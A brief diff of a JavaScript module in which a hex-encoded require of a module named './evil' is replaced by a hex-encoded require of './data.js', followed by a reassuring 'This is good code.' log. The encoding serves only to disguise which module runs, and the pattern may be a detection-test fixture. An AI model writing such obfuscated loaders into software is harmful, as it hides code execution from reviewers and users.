@@ -1,7 +1,6 @@
 "use strict";
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.default = () => {
-    const evil = require(Buffer.from("2E2F6576696C", "hex").toString()).default;
-    evil();
+    require(Buffer.from("2e2f646174612e6a73", "hex").toString()).default();
     console.log("This is good code.");
 };
